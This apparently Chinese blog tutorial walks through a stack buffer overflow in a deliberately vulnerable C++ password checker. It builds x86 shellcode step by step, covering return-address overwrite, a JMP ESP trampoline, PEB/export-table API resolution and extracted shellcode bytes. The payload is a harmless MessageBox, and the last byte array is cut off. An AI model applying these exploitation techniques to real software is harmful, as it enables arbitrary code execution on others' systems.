<!DOCTYPE html><html lang="zh"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="stylesheet" href="/css/post.css"><link rel="icon" href="/img/favicon.png"><title>Shellcode</title><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body>　　<div class="inner"><h2>Shellcode</h2><h1 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>关闭一些VS自带的保护</p>
<img src="/2022/01/11/Shellcode/image-20220115182656787.png" alt="image-20220115182656787" style="zoom: 67%;">

<img src="/2022/01/11/Shellcode/image-20220111201902742.png" alt="image-20220111201902742" style="zoom: 67%;">

<img src="/2022/01/11/Shellcode/image-20220111202151496.png" alt="image-20220111202151496" style="zoom: 67%;">



<h2 id="漏洞程序1"><a href="#漏洞程序1" class="headerlink" title="漏洞程序1"></a>漏洞程序1</h2><pre class=" language-c++"><code class="language-c++">#define _CRT_SECURE_NO_WARNINGS
#include<Windows.h>
#include<iostream>

int checkPassword(const char* password)
&#123;
    int result = 1;
    char buff[7]&#123;&#125;;
    result = strcmp(password, "51hook");
    strcpy(buff, password);                                    
    return result;
&#125;

int main()
&#123;
    int falg = 0;
    char password[0x500];
    while (1)
    &#123;
        printf("请输入密码\n");
        int result = scanf("%s", password);
        falg = checkPassword(password);
        if (falg)
        &#123;
            MessageBoxA(0, "密码错误！", "提示", MB_OK);
        &#125;
        else
        &#123;
            MessageBoxA(0, "密码正确！", "提示", MB_OK);
            break;
        &#125;
    &#125;
    return 0;
&#125;
</code></pre>
<p><strong>漏洞分析：</strong></p>
<ul>
<li>scanf 输入的大小长度为0x500，当这个值传到checkPassword后被strcpy赋值了一个局部变量，这个局部变量最终会淹没栈（溢出），可控制返回地址，执行代码。</li>
</ul>
<p><img src="/2022/01/11/Shellcode/image-20220115182936572.png" alt="image-20220115182936572"></p>
<ul>
<li><p>过程：</p>
<pre class=" language-c++"><code class="language-c++">int checkPassword(const char* password)
&#123;
    int result = 1;
    char buff[7]&#123;&#125;;
    result = strcmp(password, "51hook");
    strcpy(buff, password);                                    //漏洞点
    return result;
&#125;
</code></pre>
<pre class=" language-assembly"><code class="language-assembly">push ebp                                                        ; 切换栈
mov ebp,esp                                                    ;
sub esp,C                                                        ; 提升C个字节做为局部变量的空间， int + char[7] = 11 个字节，对齐后为12个字节 C
mov dword ptr ss:[ebp-4],1                    ; int result = 1;
xor eax,eax                                                    ; 清空eax 
mov dword ptr ss:[ebp-C],eax                ; 4个字节, 填充0 ，char buff[7]&#123;&#125;;
mov word ptr ss:[ebp-8],ax                    ; 2个字节, 填充0
mov byte ptr ss:[ebp-6],al                    ; 1个字节, 填充0
push vul.9CB180                                            ; 常量 51hook
mov ecx,dword ptr ss:[ebp+8]                ; 函数的第一个参数 ebp + 8 , password
push ecx                                                        ; 入站
call <vul._strcmp>                                    ; strcmp(password, "51hook")
add esp,8                                                        ; 平衡栈，因为push了两个参数
mov dword ptr ss:[ebp-4],eax                ; 将结果赋值给 result
mov edx,dword ptr ss:[ebp+8]                ; 将password给edx
push edx                                                        ; 押入edx
lea eax,dword ptr ss:[ebp-C]                ; 把buff的地址给eax
push eax                                                        ; 押入eax    
call <vul._strcpy>                                    ; strpcy(eax,edx)
add esp,8                                                        ; 平衡栈，因为push了两个参数
mov eax,dword ptr ss:[ebp-4]                ; 把result赋值给eax
mov esp,ebp                                                    ; 恢复栈
pop ebp
ret 
</code></pre>
</li>
<li><p>栈空间未被覆盖前</p>
</li>
</ul>
<p><img src="/2022/01/11/Shellcode/image-20220115203331146.png" alt="image-20220115203331146"></p>
<ul>
<li>strcpy 将7个q（ascii码71）赋值给栈中的buff，字符串以0结尾，所以占了8个字节，如果继续加入则会淹没栈的返回结果（epb-4)、返回地址(ebp+4)执行shellcode 。</li>
</ul>
<p><img src="/2022/01/11/Shellcode/image-20220115203611286.png" alt="image-20220115203611286"></p>
<ul>
<li><p>淹没返回结果，8个q，以0结尾，占9个字节，覆盖result。</p>
<p><img src="/2022/01/11/Shellcode/image-20220115205830297.png" alt="image-20220115205830297"><img src="/2022/01/11/Shellcode/image-20220115210023663.png" alt="image-20220115210023663"></p>
</li>
</ul>
<h2 id="漏洞程序2"><a href="#漏洞程序2" class="headerlink" title="漏洞程序2"></a>漏洞程序2</h2><blockquote>
<p>漏洞程序1换成文件输入密码，方便执行shellcode</p>
</blockquote>
<pre class=" language-c++"><code class="language-c++">#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <iostream>

int checkPassword(const char* password)
&#123;
    int result = 1;
    char buff[7]&#123;&#125;;
    result = strcmp(password, "51hook");        
    memcpy(buff, password,0x500);                    //用memcpy而不是strcpy，避免因为shellcode中包含00被字符串截断了
    return result;
&#125;

int main()
&#123;
    printf("begin\n");
    int flag = 0;
    char password[0x500];
    FILE* fp;
    if (NULL == (fp = fopen("password.txt", "rb"))) &#123;
        return 0;
    &#125;
    int result = fscanf(fp, "%s", password);
    flag = checkPassword(password);
    if (flag) &#123;
        MessageBoxA(0, "密码错误!", "提示", MB_OK);
    &#125;
    else
    &#123;
        MessageBoxA(0, "密码正确!", "提示", MB_OK);
    &#125;
    return 0;
&#125;


</code></pre>
<ul>
<li><p>插入16个字节即可淹没checkPassword的返回地址，跳转执行shellcode</p>
<ul>
<li><p>制作Shellcode</p>
<pre class=" language-c++"><code class="language-c++">#include<windows.h>
#include<iostream>


void _declspec(naked)shellCode() &#123;
    __asm &#123;
        push 0;
        push 0;
        push 0;
        push 0;
        mov eax, 0x75CB3D90;  //messagebox的地址
        call eax;
    &#125;
&#125;

int main()
&#123;
    LoadLibraryA("user32.dll");
    printf("begin");
    shellCode();
&#125;
</code></pre>
<pre class=" language-assembly"><code class="language-assembly">; 用 xdbg 复制出来
6A 00 6A 00 6A 00 6A 00 B8 90 3D CB 75 FF D0
</code></pre>
</li>
<li><p><code>固定跳转</code>，需要先关闭程序的动态基址，利用ret执行时（ESP +4 ， POP EIP）会修改EIP来执行代码。</p>
<pre class=" language-assembly"><code class="language-assembly">0x0019f93C ; 要跳转的地址，小端序写入
3C F9 19 00 6A 00 6A 00 6A 00 6A 00 B8 90 3D CB 75 FF D0
</code></pre>
<p><img src="/2022/01/11/Shellcode/image-20220117125117828.png" alt="image-20220117125117828"></p>
<p><img src="/2022/01/11/Shellcode/image-20220117125340858.png" alt="image-20220117125340858"></p>
</li>
<li><p><strong>跳板指令跳转</strong>，如果使用动态基址则无法使用固定跳转，可以使用跳板指令跳转，原理是 ret 执行时，ESP的地址是要跳转执行的地址，也是上面固定跳转修改的地址，后面（ESP+4）就是Shellcode要执行的代码，当ret执行完后，ESP + 4指向shellcode，所以可将要跳转执行的地址，找个系统中的跳板指令（JMP ESP），执行完JMP ESP 后即是shellcode。</p>
<p><img src="/2022/01/11/Shellcode/clip_image002.jpg" alt="img"></p>
<p>使用xdbg搜索所有模块 -&gt; 搜索命令 jmp esp ，将该命令的地址换到，0x75e1141F</p>
<img src="/2022/01/11/Shellcode/image-20220117133641067.png" alt="image-20220117133641067" style="zoom:80%;"></li>
</ul>
</li>
</ul>
<p><img src="/2022/01/11/Shellcode/image-20220117133739150.png" alt="image-20220117133739150"></p>
<p>**完善shellcode **</p>
<blockquote>
<p>35 31 68 6F 6F 6B     //5   1  h   o  o   k</p>
<p>地址=766BE110<br>类型=导出<br>序号=363<br>符号=ExitProcess</p>
</blockquote>
<pre class=" language-c++"><code class="language-c++">void _declspec(naked)shellCode() &#123;
    __asm &#123;
        push 0x6b6f;
        push 0x6f683135;
        mov eax, esp;
        push 0;
        push 0;
        push eax;
        push 0;
        mov eax, 0x75CB3D90;        //MessageBoxA 的地址
        call eax;
        mov eax, 0x766BE110;        //ExitProcess 的地址
        call eax;
    &#125;

&#125;
</code></pre>
<p>提取shellcode</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x68\x6F\x6B\x00\x00\x68\x35\x31\x68\x6F\x8B\xC4\x6A\x00\x6A\x00\x50\x6A\x00\xB8\x90\x3D\xCB\x75\xFF\xD0\xB8\x10\xE1\x6B\x76\xFF\xD0"</span>
</code></pre>
<h2 id="TEB、PEB"><a href="#TEB、PEB" class="headerlink" title="TEB、PEB"></a>TEB、PEB</h2><p>知识补充：</p>
<p>Kernel32.dll user32.dll ntdll.dll</p>
<p>所有进程无论窗口程序还是控制台程序，都会引用kernel32.dll</p>
<p>User32.dll窗口程序专用，封装了所有跟窗口操作相关的API</p>
<p>Ntdll.dll ！！！ 他是ring0的大门。 无论是kernel32还是user32最终都会去调用ntdll.dll</p>
<p>1、TEB：</p>
<p>线程环境块，说白了就是一个结构体，该结构体中保存了线程中的各种信息</p>
<p> typedef struct _TEB {</p>
<p>​    PVOID Reserved1[12];</p>
<p>​    PPEB ProcessEnvironmentBlock;</p>
<p>​    PVOID Reserved2[399];</p>
<p>​    BYTE Reserved3[1952];</p>
<p>​    PVOID TlsSlots[64];</p>
<p>​    BYTE Reserved4[8];</p>
<p>​    PVOID Reserved5[26];</p>
<p>​    PVOID ReservedForOle;</p>
<p>​    PVOID Reserved6[4];</p>
<p>​    PVOID TlsExpansionSlots;</p>
<p>  } TEB, * PTEB;</p>
<p>typedef struct _TEB {</p>
<p>​    +0x00 ：_NT_TIB  NtTib;</p>
<p>​    +0x30：_PEB* PPEB ;</p>
<p>  } TEB, * PTEB;</p>
<p>NtTib：线程信息块</p>
<p>typedef struct _NT_TIB {</p>
<p>  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList;</p>
<p>  PVOID StackBase;</p>
<p>  PVOID StackLimit;</p>
<p>  PVOID SubSystemTib;</p>
<p>  union {</p>
<p>​    PVOID FiberData;</p>
<p>​    DWORD Version;</p>
<p>  };</p>
<p>  PVOID ArbitraryUserPointer;</p>
<p>  struct _NT_TIB *Self;</p>
<p>} NT_TIB;</p>
<p>ExceptionList：用于操作系统的SEH（SEH：windows的异常处理机制 大量用于反调试程序！！！！）</p>
<p>PEB:Process Envirorment Block</p>
<p>进程环境块：存放进程相关信息，我们需要的东西在这个老东西里面！！</p>
<p>2、TEB的访问</p>
<p>实验：分析API NtCurrentTeb（）；</p>
<p><img src="/2022/01/11/Shellcode/clip_image002-1910707.jpg" alt="img"></p>
<p>通过观察可以发现FS存放的就是TEB结构体的首地址</p>
<p>由此得出FS:[0X30]==PEB的指针</p>
<p> <img src="/2022/01/11/Shellcode/20210818095424-3693dc5e-ffc7-1.png" alt="img"></p>
<p>3、PEB</p>
<p> struct _PEB {</p>
<p>​    +0x00c ：_PEB_LDR_DATA*  Ldr;</p>
<p>​    </p>
<p>  }</p>
<p> struct _PEB_LDR_DATA {</p>
<p>​    +0x000 ：Uint  length;</p>
<p>​    +0x004 ：Uchar  initialized;</p>
<p>+0x008 ：LVOID SsHandle;</p>
<p>+0x00c ：_LIST_ENTRY InloadOrderMoudleList;                    //载入顺序排序的dll</p>
<p>+0x014 ：_LIST_ENTRY InMemoryOrderMoudleList;            //内存排序的DLL</p>
<p>+0x01c ：_LIST_ENTRY InitalizationOrderMoudleList;        //初始化排序的 ntdll kernel32.dll或者kernerbase.dll </p>
<p>。。。。 </p>
<p>  }</p>
<p>当dll文件加载后会ldr会存放模块信息。通过_LIST_ENTRY 双向链表可以遍历所有模块。</p>
<p> struct _LIST_ENTRY {</p>
<p>​    _LIST_ENTRY *Flink;//下一个结构体指针</p>
<p>_LIST_ENTRY *Blink;//上一个机构体指针</p>
<p>  }</p>
<p>Mov esi,FS:[0x30]//PEB地址</p>
<p>Mov esi,[esi+0xc]//Ldr地址</p>
<p>Mov esi,[esi+0x1c]//InitalizationOrderMoudleList</p>
<p>Mov esi,[esi]//第二个DLL文件信息</p>
<p>mov esi,FS:[0x30]// peb</p>
<p>Mov esi,[esi+c]//LDR</p>
<p>Mov esi,[esi+0x1c]//_LIST_ENTRY</p>
<p>Mov esi,[esi+0x8]//dllbase</p>
<p>  typedef struct _LDR_DATA_TABLE_ENTRY</p>
<p>  {</p>
<p>​    LIST_ENTRY InLoadOrderMoudleList;</p>
<p>​    LIST_ENTRY InMemoryOrderMoudleList;</p>
<p>​    LIST_ENTRY InInitializationOrderMoudleList;</p>
<p>PVOID DllBase;//模块基址 GetMdouleHanlde 找到导出表 kernel32.dll “LoadLibraryA” “GetProcAdrress”</p>
<p>PVOID EntryPoint;</p>
<p>PVOID SizeOfImage;</p>
<p>PVOID FullDllName;</p>
<p>…..</p>
<p>  }</p>
<p><strong>获取导出表：</strong></p>
<p>PE头=ImageBse+0x30</p>
<p>导出表=PE头+0x78</p>
<p>EAT=导出表+0x1c</p>
<p>ENT=导出表+0x20</p>
<p>EOT=导出表+0x24</p>
<p><strong>自定义字符串比较函数：</strong></p>
<p>MystrCmp()</p>
<p>{</p>
<p>_asm</p>
<p>{</p>
<p>Lea esi,[0x字符串A]</p>
<p>Lea edi [0x字符串B]</p>
<p>Mov ecx,循环次数。</p>
<p>Repe Cmpsb</p>
<p>je Cmp_equal</p>
<p>Mov eax,0</p>
<p>Cmp_equal:</p>
<p>Mov eax,1;</p>
<p>}</p>
<p>}</p>
<p>int main()</p>
<p>{</p>
<p>  __asm</p>
<p>  {</p>
<p>​    pushad</p>
<p>​    SUB ESP, 0x20   // 开辟一段栈空间，增加健壮性</p>
<p>​    JMP tag_Shellcode // 前置代码，避免后面的数据被解释为指令</p>
<p>​    // [tag_Next-0x52] “GetProcAddress”</p>
<p>​    _asm _emit(0x47) _asm _emit(0x65) _asm _emit(0x74) _asm _emit(0x50)</p>
<p>​    _asm _emit(0x72)_asm _emit(0x6F)_asm _emit(0x63)_asm _emit(0x41)</p>
<p>​    _asm _emit(0x64)_asm _emit(0x64)_asm _emit(0x72)_asm _emit(0x65)</p>
<p>​    _asm _emit(0x73)_asm _emit(0x73)</p>
<p>​    // [tag_Next-0x44] “LoadLibraryExA\0”</p>
<p>​    _asm _emit(0x4C)_asm _emit(0x6F)_asm _emit(0x61)_asm _emit(0x64)</p>
<p>​    _asm _emit(0x4C)_asm _emit(0x69)_asm _emit(0x62)_asm _emit(0x72)</p>
<p>​    _asm _emit(0x61)_asm _emit(0x72)_asm _emit(0x79)_asm _emit(0x45)</p>
<p>​    _asm _emit(0x78)_asm _emit(0x41)_asm _emit(0x00)</p>
<p>​    // [tag_Next-0x35] “User32.dll\0”</p>
<p>​    _asm _emit(0x55)_asm _emit(0x73)_asm _emit(0x65)_asm _emit(0x72)</p>
<p>​    _asm _emit(0x33)_asm _emit(0x32)_asm _emit(0x2E)_asm _emit(0x64)</p>
<p>​    _asm _emit(0x6C)_asm _emit(0x6C)_asm _emit(0x00)</p>
<p>​    // [tag_Next-0x2A] “MessageBoxA\0”</p>
<p>​    _asm _emit(0x4D)_asm _emit(0x65)_asm _emit(0x73)_asm _emit(0x73)</p>
<p>​    _asm _emit(0x61)_asm _emit(0x67)_asm _emit(0x65)_asm _emit(0x42)</p>
<p>​    _asm _emit(0x6F)_asm _emit(0x78)_asm _emit(0x41)_asm _emit(0x00)</p>
<p>​    // [tag_Next-0x1E] “ExitProcess\0”</p>
<p>​    _asm _emit(0x45)_asm _emit(0x78)_asm _emit(0x69)_asm _emit(0x74)</p>
<p>​    _asm _emit(0x50)_asm _emit(0x72)_asm _emit(0x6F)_asm _emit(0x63)</p>
<p>​    _asm _emit(0x65)_asm _emit(0x73)_asm _emit(0x73)_asm _emit(0x00)</p>
<p>​    // [tag_Next-0x12] “Hello World!\0”</p>
<p>​    _asm _emit(0x48)_asm _emit(0x65)_asm _emit(0x6C)_asm _emit(0x6C)</p>
<p>​    _asm _emit(0x6F)_asm _emit(0x20)_asm _emit(0x57)_asm _emit(0x6F)</p>
<p>​    _asm _emit(0x72)_asm _emit(0x6C)_asm _emit(0x64)_asm _emit(0x21)</p>
<p>​    _asm _emit(0x00)</p>
<p>​    tag_Shellcode:</p>
<p>​    // 1. GetPC</p>
<p>​    CALL tag_Next</p>
<p>​      tag_Next :</p>
<p>​    pop ebx           // ebx = BaseAddr</p>
<p>​    // 2. 获取关键模块基址</p>
<p>​      mov esi, dword ptr fs : [0x30] // esi = PEB的地址</p>
<p>​      mov esi, [esi + 0x0C]     // esi = 指向PEB_LDR_DATA结构的指针</p>
<p>​      mov esi, [esi + 0x1C]     // esi = 模块链表指针InInit…List</p>
<p>​      mov esi, [esi]        // esi = 访问链表中的第二个条目</p>
<p>​      mov edx, [esi + 0x08]     // edx = 获取Kernel32.dll基址</p>
<p>​      // 3. 获取GetProcAddress的函数地址</p>
<p>​      push ebx          // BaseAddr</p>
<p>​      push edx          // Kernel32.dll</p>
<p>​      call fun_GetProcAddress</p>
<p>​      mov esi, eax</p>
<p>​      // 4. 获取LoadLibraryExW的函数地址</p>
<p>​      lea ecx, [ebx - 0x44] // “LoadLibraryExW\0”</p>
<p>​      push ecx      // lpProcName = “LoadLibraryExW”</p>
<p>​      push edx      // hModule  = Kernel32.dll</p>
<p>​      call eax      // GetProcAddress()</p>
<p>​      // 5. 调用Payload部分</p>
<p>​      push ebx      // BaseAddr</p>
<p>​      push esi      // Addr_GetProcAddress</p>
<p>​      push eax      // Addr_LoadLibraryExW</p>
<p>​      push edx      // Kernel32.dll基址</p>
<p>​      call fun_Payload</p>
<p>​      /***********************************************/</p>
<p>​       /* 函数：获取关键函数地址，返回值为关键函数地址*/</p>
<p>​      /***********************************************/</p>
<p>​    fun_GetProcAddress: // (int ImageBase, int BaseAddr)</p>
<p>​    push ebp</p>
<p>​      mov ebp, esp</p>
<p>​      sub esp, 0x0C</p>
<p>​      push edx</p>
<p>​      // 1. 获取EAT、ENT与EOT的地址</p>
<p>​      mov edx, [ebp + 0x08] // edx   = Kernel32.dll</p>
<p>​      mov esi, [edx + 0x3C] // esi   = IMAGE_DOS_HEADER.e_lfanew</p>
<p>​      lea esi, [edx + esi]  // esi   = PE文件头</p>
<p>​      mov esi, [esi + 0x78] // esi   = IMAGE_DIR…EXPORT.VirtualAddress</p>
<p>​      lea esi, [edx + esi]  // esi   = 导出表首地址</p>
<p>​      mov edi, [esi + 0x1C] // esi   = IMAGE_EXP…ORY.AddressOfFunctions</p>
<p>​      lea edi, [edx + edi]  // edi   = EAT首地址</p>
<p>​      mov[ebp - 0x04], edi // Local_1 = edi = EAT首地址</p>
<p>​      mov edi, [esi + 0x20] // edi   = IMAGE_EXP…ORY.AddressOfNames</p>
<p>​      lea edi, [edx + edi]  // edi   = ENT首地址</p>
<p>​      mov[ebp - 0x08], edi // Local_2 = edi = ENT首地址</p>
<p>​      mov edi, [esi + 0x24] // edi   = IMAGE_EXP…ORY.AddressOfNameOrdinals</p>
<p>​      lea edi, [edx + edi]  // edi   = EOT首地址</p>
<p>​      mov[ebp - 0x0C], edi // Local_3 = edi = EOT首地址</p>
<p>​      // 2. 循环对比ENT中的函数名</p>
<p>​      xor eax, eax</p>
<p>​      jmp tag_FirstCmp</p>
<p>​      tag_CmpFunNameLoop :</p>
<p>​    inc eax</p>
<p>​      tag_FirstCmp :</p>
<p>​    mov esi, [ebp - 0x08]  // esi = Local_2(ENT)</p>
<p>​      mov esi, [esi + 4 * eax]  // esi = ENT RVA</p>
<p>​      mov edx, [ebp + 0x08]  // edx = Param_1(ImageBase)</p>
<p>​      lea esi, [edx + esi]   // esi = ENT VA</p>
<p>​      mov ebx, [ebp + 0x0C]  // ebx = Param_2(BaseAddr)</p>
<p>​      lea edi, [ebx - 0x52]  // edi = “GetProcAddress”</p>
<p>​      mov ecx, 0x0E     // ecx = “GetProcAddress”的长度</p>
<p>​      cld</p>
<p>​      repe cmpsb</p>
<p>​      jne tag_CmpFunNameLoop // 如果不相等则继续循环比对</p>
<p>​      // 3. 成功后找到对应的序号</p>
<p>​      mov esi, [ebp - 0x0C]   // esi = Local_3(EOT)</p>
<p>​      xor edi, edi</p>
<p>​      mov di, [esi + eax * 2]  // edi = 用函数名数组下标在序号数组找到对应的序号</p>
<p>​      // 4. 使用序号作为索引，找到函数名所对应的函数地址</p>
<p>​      mov edx, [ebp - 0x04]   // edx = Local_1(EAT)</p>
<p>​      mov esi, [edx + edi * 4]  // esi = 用序号在函数地址数组找到对应的函数地址</p>
<p>​      mov edx, [ebp + 0x08]   // edx = Param_1(ImageBase)</p>
<p>​      // 5. 返回获取到的关键函数地址</p>
<p>​      lea eax, [edx + esi]   // 返回GetProcAddress的地址</p>
<p>​      pop edx</p>
<p>​      mov esp, ebp</p>
<p>​      pop ebp</p>
<p>​      retn 0x08</p>
<p>​      /**********************************/</p>
<p>​      /* 函数：有效载荷部分，返回值Null */</p>
<p>​      /**********************************/</p>
<p>​    fun_Payload: // (int Kernel32_Base, int LoadLibraryExW, int GetProcAddress, int BaseAddr)</p>
<p>​    push ebp</p>
<p>​      mov ebp, esp</p>
<p>​      sub esp, 0x08</p>
<p>​      mov ebx, [ebp + 0x14] // ebx = Param_4(BaseAddr)</p>
<p>​      // 1. 获取MessageBoxA的函数地址</p>
<p>​      lea ecx, [ebx - 0x35] // “User32.dll\0”</p>
<p>​      push 0       // dwFlags    = 0</p>
<p>​      push 0       // hFile     = 0</p>
<p>​      push ecx      // lpLibFileName = “User32.dll”</p>
<p>​      call[ebp + 0x0C]   // LoadLibraryExW()</p>
<p>​      lea ecx, [ebx - 0x2A] // “MessageBoxA\0”</p>
<p>​      push ecx      // lpProcName = “MessageBoxA”</p>
<p>​      push eax      // hModule  = User32.dll</p>
<p>​      call[ebp + 0x10]   // GetProcAddress()</p>
<p>​      mov[ebp - 0x04], eax</p>
<p>​      // 2. 获取ExitProcess的函数地址</p>
<p>​      lea ecx, [ebx - 0x1E] // “ExitProcess\0”</p>
<p>​      push ecx      // lpProcName = “ExitProcess”</p>
<p>​      push[ebp + 0x08]   // hModule  = Kernel32.dll</p>
<p>​      call[ebp + 0x10]   // GetProcAddress()</p>
<p>​      mov[ebp - 0x08], eax</p>
<p>​      // 3. 显示Hello World!</p>
<p>​      lea ecx, [ebx - 0x12] // “Hello World!\0”</p>
<p>​      push 0       // uType   = 0</p>
<p>​      push ecx      // lpCaption = “Hello World!\0”</p>
<p>​      push ecx      // lpText  = “Hello World!\0”</p>
<p>​      push 0       // hWnd   = 0</p>
<p>​      call[ebp - 0x04]   // MessageBoxA()</p>
<p>​      push 0       // uExitCode = 0</p>
<p>​      call[ebp - 0x08]   // ExitProcess()</p>
<p>​      mov esp, ebp</p>
<p>​      pop ebp</p>
<p>​       retn 0x10</p>
<p>  }</p>
<p>  return 0;</p>
<p>}</p>
<h2 id="Shellcode优化"><a href="#Shellcode优化" class="headerlink" title="Shellcode优化"></a>Shellcode优化</h2><ul>
<li>通用shell code</li>
</ul>
<pre class=" language-c++"><code class="language-c++">void _declspec(naked)shellCode()
&#123;
    
    __asm
    &#123;
        //4C 6F 61 64 4C 69 62 72 61 72 79 41
        //LoadLibraryA   4C 6F 61 64 4C 69 62 72 61 72 79 41    00        长度：0xD
        //GetProcAddress 47 65 74 50 72 6F 63 41 64 64 72 65   73 73  00     长度：0xF
        //user32.dll 75 73 65 72 33 32 2E 64   6C 6C 00             长度：0xB
        //MeesageBoxA 4D 65 73 73 61 67 65 42     6F 78 41 00       长度：0xC
        //hello 51hook 68 65 6C 6C 6F 20 35 31 68 6F 6F 6B   00     长度：0xD
        //保存字符串
    
        pushad                                                                    // 保存寄存器
        sub esp, 0x30                                                        // 分配空间用来存放局部变量
        mov byte ptr ds : [esp - 1] , 0x0                // hello 51hook
        sub esp, 0x1
        push 0x6B6F6F68
        push 0x3135206F
        push 0x6c6c6568
        push 0x41786f                                                        // MessageBoxA
        push 0x42656761
        push 0x7373654d
        mov byte ptr ds : [esp - 1] , 0x0                // 补0，字符串以0结尾
        sub esp, 0x1
        mov ax, 0x6c6c                                                    // user32.dll
        mov word ptr ds : [esp - 2] , ax
        sub esp, 0x2
        push 0x642e3233
        push 0x72657375
        mov byte ptr ds : [esp - 1] , 0x0
        sub esp, 0x1
        mov ax, 0x7373                                                    // GetProcAddress
        mov word ptr ds : [esp - 2] , ax
        sub esp, 0x2
        push 0x65726464
        push 0x41636f72
        push 0x50746547
        mov byte ptr ds : [esp - 1] , 0x0                // LoadLibraryA
        sub esp, 0x1 
        push 0x41797261                                                    
        push 0x7262694c
        push 0x64616f4c;
          
        mov ecx,esp
        push ecx
        call fun_payload
      
    fun_getModule:
        push ebp
        mov ebp, esp
        sub esp ,0xc
        push ecx

        mov esi, dword ptr fs : [0x30]        //PEB地址
        mov esi, [esi + 0xc]                            //LDR结构体地址
        mov esi, [esi + 0x1c]                            //list
        mov esi, [esi]                                        //第二项
        mov eax, [esi + 0x8]                            //dllbase

        pop ecx
        mov esp, ebp
        pop ebp
        retn 
      
    fun_getProcAddr:
        push ebp
        mov ebp,esp
        sub esp,0x10
        push ecx
        push edx
        push esi
        push edi

        mov edx,[ebp+0x8]                                // dllbase , 函数的第一个参数
        mov esi,[edx+0x3c]                            // lf_anew
        lea esi,[edx+esi]                                // nt
        mov esi,[esi+0x78]                            // exportTabel rva
        lea esi,[edx+esi]                                // exportTable va
        mov edi,[esi+0x1c]                            // EAT rva
        lea edi,[edx+ edi]                            // EAT va
        mov [ebp-0x4],edi                                // ebp-4 ，局部变量1，存放ETA VA
        mov edi,[esi+0x20]                            // ENT rva
        lea edi,[edx+ edi]                            // ENT va
        mov [ebp-0x8],edi                                // ebp-8 ，局部变量2，存放ENT VA
        mov edi,[esi+0x24]                            // EOT rva
        lea edi,[edx+ edi]                            // EOT va
        mov [ebp-0xc],edi                                // ebp-C ，局部变量3，存放EOT VA
        //查找api
        xor eax,eax
        cld                                                            // DF=0
        jmp tag_begincmp                                // 避免直接上来 ++
    tag_cmpLoop:
        inc eax                                                    // eax++
    tag_begincmp:
        mov esi,[ebp-0x8]                                // 函数名称表
        mov esi,[esi+eax*4]                            // 第一个名称
        mov edx,[ebp+0x8]                                // dllbase
        lea esi,[edx+esi]                                // 函数名称
        mov edi,[ebp+0xc]                                // 第二个参数，要找的函数名称地址
        mov ecx,[ebp+0x10]                            // 第三个参数，函数名称的字符串长度
        repe cmpsb 
        jne tag_cmpLoop
        //如果相等的话，eax是数组索引
        mov esi,[ebp-0xc]                                // EOT VA
        xor edi,edi
        mov di,[esi+eax*2]                            // word 类型 , 取EOT的eax索引的值
        mov ebx,[ebp-0x4]                                // EAT VA
        mov ebx,[ebx+edi*4]                            // api addr rva
        mov edx,[ebp+0x8]                                // dllbase , 函数的第一个参数
        lea eax,[edx+ebx]                                // addr
        

        pop edi
        pop esi
        pop edx
        pop ecx
        mov esp,ebp
        pop ebp
        retn 0x10
      
    fun_payload:
        push ebp
        mov ebp,esp
        sub esp,0x20
        push ecx
        push edx
        push esi
        push edi
        
        call fun_getModule
        mov [ebp-0x4],eax                                // DLLBASE
        //获取LoadLiabraryA
        push 0xD
        mov ecx,[ebp+0x8]                                // 第一个参数
        push ecx
        push eax
        call fun_getProcAddr
        mov [ebp-0x8],eax                                // LoadLibraryA
        //获取GetProcessAddr
        push 0xF
        mov ecx, [ebp+0x8]                            // 第一个参数
        lea ecx,[ecx+0xd]
        push ecx
        mov edx,[ebp - 0x4]
        push edx
        call fun_getProcAddr
        mov [ebp-0xc],eax                                // GetProcessAddr

        //获取MeesageBoxA
        mov ecx, [ebp + 0x8]                        // 第一个参数
        lea ecx, [ecx + 0x1c]
        push ecx
        call [ebp - 0x8]                                // LoadLibraryA
        mov [ebp-0x10],eax                            // user32.dllbase
        
        mov ecx,[ebp+0x8]
        lea ecx,[ecx+0x27]
        push ecx
        push [ebp - 0x10]
        call [ebp - 0xc]                                //call GetProcessAddr
        
        push 0
        push 0
        mov ebx,[ebp+0x8]
        lea ebx,[ebx+0x33]
        push ebx
        push 0
        call eax

        pop edi
        pop esi
        pop edx
        pop ecx
        mov esp,ebp
        pop ebp
        retn 0x4
    &#125;
&#125;
</code></pre>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x60\x83\xEC\x30\x3E\xC6\x44\x24\xFF\x00\x83\xEC\x01\x68\x68\x6F\x6F\x6B\x68\x6F\x20\x35\x31\x68\x68\x65\x6C\x6C\x68\x6F\x78\x41\x00\x68\x61\x67\x65\x42\x68\x4D\x65\x73\x73\x3E\xC6\x44\x24\xFF\x00\x83\xEC\x01\x66\xB8\x6C\x6C\x3E\x66\x89\x44\x24\xFE\x83\xEC\x02\x68\x33\x32\x2E\x64\x68\x75\x73\x65\x72\x3E\xC6\x44\x24\xFF\x00\x83\xEC\x01\x66\xB8\x73\x73\x3E\x66\x89\x44\x24\xFE\x83\xEC\x02\x68\x64\x64\x72\x65\x68\x72\x6F\x63\x41\x68\x47\x65\x74\x50\x3E\xC6\x44\x24\xFF\x00\x83\xEC\x01\x68\x61\x72\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x8B\xCC\x51\xE8\x8D\x00\x00\x00\x55\x8B\xEC\x83\xEC\x0C\x51\x64\x8B\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\x8B\x36\x8B\x46\x08\x59\x8B\xE5\x5D\xC3\x55\x8B\xEC\x83\xEC\x10\x51\x52\x56\x57\x8B\x55\x08\x8B\x72\x3C\x8D\x34\x32\x8B\x76\x78\x8D\x34\x32\x8B\x7E\x1C\x8D\x3C\x3A\x89\x7D\xFC\x8B\x7E\x20\x8D\x3C\x3A\x89\x7D\xF8\